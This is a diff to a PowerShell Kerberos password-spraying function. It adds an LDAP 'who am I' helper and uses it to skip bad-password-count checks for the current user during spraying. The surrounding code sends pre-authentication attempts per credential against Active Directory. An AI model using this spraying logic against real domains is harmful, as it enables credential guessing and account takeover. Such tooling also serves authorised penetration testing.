@@ -418,6 +418,10 @@ Function Local:New-KerberosSpray {
         }
     }
 
+    if ($CheckOldPwd) {
+        $currentUser = ((Get-LdapCurrentUser -Server $Server).Split('\\'))[1]
+    }
+
     foreach ($cred in $Collection) {
         if ($cred.badPwdCount -eq -1) {
             $cred.PSObject.Properties.Remove('BadPwdCount')
@@ -446,6 +450,7 @@ Function Local:New-KerberosSpray {
             $cred.PSObject.Properties.Remove('Password')
             $cred.PSObject.Properties.Remove('NTHash')
         }
+
         $asn_AS_REP = New-KerbPreauth -EncType $eType -UserName $cred.Username -Key $keyBytes -Domain $Domain -Server $Server
         $tag = $asn_AS_REP.TagValue
 
@@ -501,7 +506,7 @@ Function Local:New-KerberosSpray {
                 # KDC_ERR_PREAUTH_FAILED
                 24 {
                     $newBadPwdCount = $null
-                    if ($CheckOldPwd -and ($($cred.Username) -ne $LdapCredential.UserName)) {
+                    if ($CheckOldPwd -and ($($cred.Username) -ne $currentUser)) {
                         $filter = "(samAccountName=$($cred.Username))"
                         $newBadPwdCount = (Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties badPwdCount -Credential $LdapCredential).badPwdCount
                     }
@@ -985,6 +990,35 @@ Function Local:Get-LdapObject {
     }
     catch {
         Write-Error $_ -ErrorAction Stop
+    }
+}
+
+# Adapted from https://github.com/leechristensen/Random/blob/master/PowerShellScripts/Get-LdapCurrentUser.ps1
+Function Local:Get-LdapCurrentUser {
+    [CmdletBinding()]
+    Param (
+        [String]
+        $Server = $Env:USERDNSDOMAIN
+    )
+
+    try {
+        [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
+
+        if ($Server) {
+            $conn = New-Object DirectoryServices.Protocols.LdapConnection $Server
+        }
+        else {
+            $ident = New-Object DirectoryServices.Protocols.LdapDirectoryIdentifier -ArgumentList @($null)
+            $conn = New-Object DirectoryServices.Protocols.LdapConnection $ident
+        }
+
+        # LDAP_SERVER_WHO_AM_I_OID = 1.3.6.1.4.1.4203.1.11.3
+        $extRequest = New-Object DirectoryServices.Protocols.ExtendedRequest "1.3.6.1.4.1.4203.1.11.3"
+        $resp = $conn.SendRequest($extRequest)
+        [Text.Encoding]::ASCII.GetString($resp.ResponseValue)
+    }
+    catch {
+        Write-Error $_
     }
 }
 
